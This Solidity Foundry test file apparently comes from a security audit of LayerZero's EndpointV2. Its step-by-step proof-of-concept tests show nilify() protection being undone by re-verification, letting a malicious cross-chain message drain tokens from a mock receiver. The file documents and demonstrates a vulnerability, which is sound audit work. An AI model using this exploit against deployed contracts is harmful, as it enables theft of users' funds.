// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { Errors } from "@layerzerolabs/lz-evm-protocol-v2/contracts/libs/Errors.sol";

import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";
import { MockToken, MockOFTReceiver } from "./mocks/AuditMocks.sol";

// ========================= PoC Tests =========================

/// @title AV10 - Nilify Un-Nilification: OApp nilification bypassed via re-verification
///
/// @notice CRITICAL severity finding.
///
/// Root cause:
///   1. `nilify()` writes NIL_PAYLOAD_HASH (bytes32(type(uint256).max)) into
///      inboundPayloadHash[...][nonce].
///   2. `_verifiable()` only blocks re-verification when the stored hash equals
///      EMPTY_PAYLOAD_HASH (bytes32(0)). NIL_PAYLOAD_HASH is NOT zero, so the
///      check passes and re-verification is allowed.
///   3. `_inbound()` unconditionally overwrites whatever is stored, including NIL.
///
/// Consequence:
///   An OApp that uses nilify() to block a suspicious message (e.g. after Precrime fires)
///   can have its protection silently undone by the currently-configured receive library
///   calling verify() again with any payloadHash — including the original malicious one.
///   No grace period is required; a single compromised (or misbehaving) library suffices.
///
/// Relevant code from MessagingChannel.sol:
///   bytes32 public constant EMPTY_PAYLOAD_HASH = bytes32(0);
///   bytes32 public constant NIL_PAYLOAD_HASH   = bytes32(type(uint256).max);
///
///   function _inbound(..., bytes32 _payloadHash) internal {
///       if (_payloadHash == EMPTY_PAYLOAD_HASH) revert ...;
///       inboundPayloadHash[...][nonce] = _payloadHash;  // UNCONDITIONAL OVERWRITE
///   }
///
///   function _verifiable(...) internal view returns (bool) {
///       return _origin.nonce > _lazyInboundNonce ||
///           inboundPayloadHash[...][nonce] != EMPTY_PAYLOAD_HASH;  // NIL passes this!
///   }
contract NilifyUnnilificationTest is AuditBase {
    MockToken internal token;
    MockOFTReceiver internal oftReceiver;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    uint256 internal constant TRANSFER_AMOUNT = 50_000e18;

    function setUp() public override {
        super.setUp();

        token = new MockToken();
        oftReceiver = new MockOFTReceiver(address(dstEndpoint), address(token));

        // Fund the OFT receiver so it can pay out cross-chain transfers.
        token.transfer(address(oftReceiver), TRANSFER_AMOUNT);
    }

    // ========================= AV10.1: Full Nilify Bypass PoC =========================

    /// @notice CRITICAL: OApp nilification is completely bypassed by a single library re-verify.
    ///
    /// Attack flow:
    ///   1. A malicious (or replayed) message is verified by the receive library; its payloadHash
    ///      is stored in inboundPayloadHash.
    ///   2. The OApp's Precrime detects the message is harmful and calls nilify(), setting the
    ///      slot to NIL_PAYLOAD_HASH — execution is blocked.
    ///   3. The attacker (controlling, or colluding with, the receive library) calls verify() +
    ///      commitVerification() for the SAME nonce with the original malicious payloadHash.
    ///      Because NIL_PAYLOAD_HASH != EMPTY_PAYLOAD_HASH, _verifiable() returns true and
    ///      _inbound() overwrites NIL with the malicious hash.
    ///   4. The malicious message is now executable again; tokens are stolen.
    ///
    /// No grace period, no second library — one compromised library is sufficient.
    function test_CRITICAL_NilifyBypassViaReverification() public {
        bytes32 senderBytes = bytes32(uint256(uint160(address(this))));

        // --- Step 1: Verify the malicious message ---
        //
        // The message encodes (attacker, TRANSFER_AMOUNT): transfers funds to the attacker.
        bytes memory maliciousMessage = abi.encode(attacker, TRANSFER_AMOUNT);
        Packet memory maliciousPacket = _makePacket(1, address(this), address(oftReceiver), maliciousMessage);

        (, bytes memory header, , bytes32 maliciousPayloadHash) = _encodeAndSplit(maliciousPacket);

        _dvnVerify(dstDvn, dstReceiveUln, header, maliciousPayloadHash, 1);
        _commitVerification(dstReceiveUln, header, maliciousPayloadHash);

        bytes32 storedAfterVerify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );
        assertEq(storedAfterVerify, maliciousPayloadHash, "Malicious hash must be stored after initial verification");

        // --- Step 2: OApp nilifies (Precrime fires) ---
        //
        // The OApp calls nilify() to block the malicious message. This sets the slot to
        // NIL_PAYLOAD_HASH (0xff...ff), which is NOT executable.
        vm.prank(address(oftReceiver));
        dstEndpoint.nilify(address(oftReceiver), SRC_EID, senderBytes, 1, maliciousPayloadHash);

        bytes32 storedAfterNilify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );
        assertEq(storedAfterNilify, bytes32(type(uint256).max), "Slot must be NIL_PAYLOAD_HASH after nilify");

        // Confirm execution is blocked at this point — hash mismatch against NIL.
        Origin memory origin = Origin({ srcEid: SRC_EID, sender: senderBytes, nonce: 1 });
        bytes32 nilHash = bytes32(type(uint256).max);
        bytes32 actualHash = keccak256(abi.encodePacked(maliciousPacket.guid, maliciousMessage));
        vm.expectRevert(abi.encodeWithSelector(Errors.LZ_PayloadHashNotFound.selector, nilHash, actualHash));
        dstEndpoint.lzReceive(origin, address(oftReceiver), maliciousPacket.guid, maliciousMessage, "");
        assertEq(token.balanceOf(attacker), 0, "Attacker must be blocked after nilify");

        // --- Step 3: Attacker's library re-verifies the nilified nonce ---
        //
        // The receive library is still the valid library. The attacker (or a compromised DVN)
        // submits a new verification for nonce 1 with the same malicious payloadHash.
        //
        // Key: NIL_PAYLOAD_HASH != EMPTY_PAYLOAD_HASH, so _verifiable() returns true.
        //      _inbound() then overwrites NIL with maliciousPayloadHash.
        _dvnVerify(dstDvn, dstReceiveUln, header, maliciousPayloadHash, 1);
        _commitVerification(dstReceiveUln, header, maliciousPayloadHash);

        bytes32 storedAfterReverify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );

        // CRITICAL: NIL was silently overwritten — nilification undone.
        assertEq(
            storedAfterReverify,
            maliciousPayloadHash,
            "CRITICAL: NIL_PAYLOAD_HASH overwritten - OApp nilification bypassed"
        );
        assertTrue(
            storedAfterReverify != bytes32(type(uint256).max),
            "Slot is no longer NIL - protection is gone"
        );

        // --- Step 4: Execute the (re-)verified malicious message — tokens stolen ---
        dstEndpoint.lzReceive(origin, address(oftReceiver), maliciousPacket.guid, maliciousMessage, "");

        assertEq(token.balanceOf(attacker), TRANSFER_AMOUNT, "Attacker stole all tokens despite nilify");
        assertEq(token.balanceOf(victim), 0, "Victim received nothing");
        assertEq(token.balanceOf(address(oftReceiver)), 0, "OFT receiver drained");
    }

    // ========================= AV10.2: Nilify State Persistence / Original Hash Restoration =========================

    /// @notice Demonstrates that nilify does NOT provide durable protection.
    ///
    /// Even when the library re-verifies with the ORIGINAL (legitimate-looking) payloadHash,
    /// the nilification is undone and the message can execute. This shows that:
    ///   - nilify() offers only transient protection.
    ///   - Any re-verification (even with the same hash that was nilified) restores executability.
    ///   - The OApp cannot distinguish "trusted re-verification" from "attacker-driven re-verification".
    function test_NilifyStatePersistence() public {
        bytes32 senderBytes = bytes32(uint256(uint160(address(this))));

        // --- Step 1: Verify the original message (funds to victim) ---
        bytes memory originalMessage = abi.encode(victim, TRANSFER_AMOUNT);
        Packet memory originalPacket = _makePacket(1, address(this), address(oftReceiver), originalMessage);

        (, bytes memory header, , bytes32 originalPayloadHash) = _encodeAndSplit(originalPacket);

        _dvnVerify(dstDvn, dstReceiveUln, header, originalPayloadHash, 1);
        _commitVerification(dstReceiveUln, header, originalPayloadHash);

        bytes32 storedAfterVerify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );
        assertEq(storedAfterVerify, originalPayloadHash, "Original hash stored after verification");

        // --- Step 2: OApp nilifies (Precrime fires a false positive, or real positive) ---
        vm.prank(address(oftReceiver));
        dstEndpoint.nilify(address(oftReceiver), SRC_EID, senderBytes, 1, originalPayloadHash);

        bytes32 storedAfterNilify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );
        assertEq(storedAfterNilify, bytes32(type(uint256).max), "NIL_PAYLOAD_HASH stored after nilify");

        // Execution is blocked after nilify — hash mismatch against NIL.
        Origin memory origin = Origin({ srcEid: SRC_EID, sender: senderBytes, nonce: 1 });
        bytes32 nilHash = bytes32(type(uint256).max);
        bytes32 actualOrigHash = keccak256(abi.encodePacked(originalPacket.guid, originalMessage));
        vm.expectRevert(abi.encodeWithSelector(Errors.LZ_PayloadHashNotFound.selector, nilHash, actualOrigHash));
        dstEndpoint.lzReceive(origin, address(oftReceiver), originalPacket.guid, originalMessage, "");

        // --- Step 3: Library re-verifies with the original payloadHash ---
        //
        // The library calls verify() again with the same hash that was nilified.
        // _verifiable() allows this because NIL_PAYLOAD_HASH != EMPTY_PAYLOAD_HASH.
        // _inbound() overwrites NIL with the original hash.
        _dvnVerify(dstDvn, dstReceiveUln, header, originalPayloadHash, 1);
        _commitVerification(dstReceiveUln, header, originalPayloadHash);

        bytes32 storedAfterReverify = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            senderBytes,
            1
        );

        // The original hash is back — nilify was silently undone.
        assertEq(storedAfterReverify, originalPayloadHash, "Original hash restored - nilify undone by re-verification");
        assertTrue(
            storedAfterReverify != bytes32(type(uint256).max),
            "Slot is no longer NIL - OApp protection removed without consent"
        );

        // --- Step 4: Execute the re-verified message — it works as if nilify never happened ---
        dstEndpoint.lzReceive(origin, address(oftReceiver), originalPacket.guid, originalMessage, "");

        // The message executed despite the OApp having nilified it.
        assertEq(token.balanceOf(victim), TRANSFER_AMOUNT, "Message executed after nilify was undone");
        assertEq(token.balanceOf(address(oftReceiver)), 0, "OFT receiver emptied");
    }

    // ========================= AV10.3: NIL_PAYLOAD_HASH Passes _verifiable Check =========================

    /// @notice Proves the core invariant violation that makes the attack possible.
    ///
    /// _verifiable() is supposed to guard re-verification: it should only allow writing
    /// to a slot that is "initializing a new nonce" OR "reverifying an already-verified nonce".
    /// The intent of the comment in the source code is:
    ///   "only allow reverifying if it hasn't been executed"
    /// But the actual check is:
    ///   inboundPayloadHash[...][nonce] != EMPTY_PAYLOAD_HASH
    ///
    /// A nilified slot holds NIL_PAYLOAD_HASH (0xff...ff), which is != EMPTY_PAYLOAD_HASH (0x00...00).
    /// Therefore _verifiable() returns true for nilified nonces, allowing the library to overwrite NIL.
    function test_NilPayloadHashPassesVerifiableCheck() public {
        bytes32 senderBytes = bytes32(uint256(uint160(address(this))));

        // Verify a message so the slot is non-empty.
        bytes memory message = abi.encode(victim, TRANSFER_AMOUNT);
        Packet memory packet = _makePacket(1, address(this), address(oftReceiver), message);
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _commitVerification(dstReceiveUln, header, payloadHash);

        // Nilify the slot.
        vm.prank(address(oftReceiver));
        dstEndpoint.nilify(address(oftReceiver), SRC_EID, senderBytes, 1, payloadHash);

        // Confirm the slot holds NIL_PAYLOAD_HASH.
        bytes32 nilHash = dstEndpoint.inboundPayloadHash(address(oftReceiver), SRC_EID, senderBytes, 1);
        assertEq(nilHash, bytes32(type(uint256).max), "Slot holds NIL_PAYLOAD_HASH");

        // Check: NIL_PAYLOAD_HASH is NOT EMPTY_PAYLOAD_HASH — this is the root cause.
        assertFalse(
            nilHash == bytes32(0),
            "NIL_PAYLOAD_HASH is not EMPTY_PAYLOAD_HASH - _verifiable will return true"
        );

        // Directly confirm that EndpointV2.verifiable() returns true for the nilified nonce.
        Origin memory origin = Origin({ srcEid: SRC_EID, sender: senderBytes, nonce: 1 });
        bool isVerifiable = dstEndpoint.verifiable(origin, address(oftReceiver));
        assertTrue(
            isVerifiable,
            "CRITICAL: verifiable() returns true for a nilified nonce - library can overwrite NIL"
        );
    }
}
